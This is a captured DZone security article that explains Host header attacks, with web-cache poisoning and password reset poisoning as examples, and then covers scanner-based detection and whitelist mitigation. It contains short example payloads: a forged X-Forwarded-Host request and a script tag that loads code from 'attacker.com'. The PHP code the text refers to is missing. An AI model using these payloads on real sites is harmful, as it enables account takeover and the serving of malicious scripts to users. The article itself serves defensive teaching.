# What Is a Host Header Attack?

_Captured: 2017-05-10 at 22:06 from [dzone.com](https://dzone.com/articles/what-is-a-host-header-attack?edition=298048&utm_source=Daily%20Digest&utm_medium=email&utm_campaign=dd%202017-05-10)_

Discover how to [protect your applications](https://dzone.com/go?i=176121&u=http%3A%2F%2Fwww.waratek.com%2Fsolutions%2Fzero-day-defense%2F%3Futm_source%3DDZone%26utm_campaign%3Dba%26utm_medium%3Dprerolltextad%26utm_content%3Dzeroday) from known and unknown vulnerabilities.

It is common practice for the same web server to host several websites or web applications on the same IP address. This why the _host_ header exists. The host header specifies which website or web application should process an incoming HTTP request. The web server uses the value of this header to dispatch the request to the specified website or web application. Each web application hosted on the same IP address is commonly referred to as a _virtual host_. So what constitutes a host header attack?

What happens if we specify an invalid Host Header? Most web servers are configured to pass the unrecognized host header to the first virtual host in the list. Therefore, it's possible to send requests with arbitrary host headers to the first virtual host.

Another way to pass arbitrary Host headers is to use the _X-Forwarded-Host_ header. In some configurations, this header will rewrite the value of the Host header. Therefore it's possible to make the following request.
    
    
    GET / HTTP/1.1 Host: www.example.com X-Forwarded-Host: www.attacker.com

Many web applications rely on the HTTP _host_ header to understand "where they are." Unfortunately, what many application developers do not realize is that the HTTP host header is controlled by the user. As you might already know, in application security user input should **always** be considered **unsafe** and therefore, **never** trusted without properly validating it first.

The use of the host header is especially common in PHP web applications, however, it's certainly not a problem endemic to PHP web applications. The PHP script in the following example is a typical and dangerous use of the host header.

An attacker can potentially manipulate the code above to produce the following HTML output just by manipulating the host header.

The two major attack vectors host header attacks enable are web-cache poisoning, and abuses of alternative channels for conducting sensitive operations, such as password resets.

## Web-Cache Poisoning

Web-cache poisoning is a technique used by an attacker to manipulate a web-cache to serve poisoned content to anyone who requests pages.

For this to occur, an attacker would need to poison a caching proxy run by the site itself, or downstream providers, content delivery networks (CDNs), syndicators, or other caching mechanisms in-between the client and the server. The cache will then serve the poisoned content to anyone who requests it, with the victim having no control whatsoever on the malicious content being served to them.

The below is an example of how an attacker could potentially exploit a host header attack by poisoning a web-cache.
    
    
    $ telnet www.example.com 80
    
    
    <script src="http://attacker.com/script.js">

## Password Reset Poisoning

A common way to implement password reset functionality is to generate a secret token and send an email with a link containing this token. What could happen if an attacker requests a password reset with an attacker-controlled host header?

If the web application makes use of the host header value when composing the reset link, an attacker can poison the password reset link that is sent to a victim. If the victim clicks on the poisoned reset link in the email, the attacker will obtain the password reset token and can go ahead and reset the victim's password.

## Detecting Password Reset Poisoning Vulnerabilities

We'll use an old version of Piwik (an open source web analytics platform) which was vulnerable to password reset poisoning via a host header attack for a demonstration of this vulnerability.

In order to detect password reset poisoning automatically, we'll need to rely on an intermediary service since the detection of password reset poisoning via a host header attack requires an out-of-band and time-delay vector. Acunetix solves this by making use of AcuMonitor as its intermediary service during an automated scan.

During a scan, Acunetix will locate the password reset page and inject a custom host header pointing to an AcuMonitor domain. If vulnerable, the application in question (an old version of Piwik in this example) will generate the password reset link using this value and send an email to the user concerned, as follows.

![Host Header Attack](https://www.acunetix.com/wp-content/uploads/2013/08/host-header-attack.png)

In the image above, pay close attention to the location of the reset link -- it points to AcuMonitor's domain instead of the web application's domain.

If the 'victim' (in this case, since it's an automated scan, it would presumably be someone on a security team conducting the scan who receives the email), follows the link, AcuMonitor will capture this request and send a notification back to Acunetix indicating it should raise an alert for password reset poisoning via a host header attack.

## Mitigation

Mitigating against host header is simple -- don't trust the host header. However, in some cases, this is easier said than done (especially situations involving legacy code). If you must use the host header as a mechanism for identifying the location of the web server, it's highly advised to make use of a **whitelist** of allowed hostnames.

Find out how [Waratek's](https://dzone.com/go?i=176122&u=http%3A%2F%2Fwww.waratek.com%2Fsolutions%2Fapplication-protection%2F%3Futm_source%3DDZone%26utm_campaign%3Dba%26utm_medium%3Dpostrolltextad%26utm_content%3Dappprotect) award-winning virtualization platform can [improve your web application security](https://dzone.com/go?i=176122&u=http%3A%2F%2Fwww.waratek.com%2Fsolutions%2Fapplication-protection%2F%3Futm_source%3DDZone%26utm_campaign%3Dba%26utm_medium%3Dpostrolltextad%26utm_content%3Dappprotect), development and operations without false positives, code changes or slowing your application.
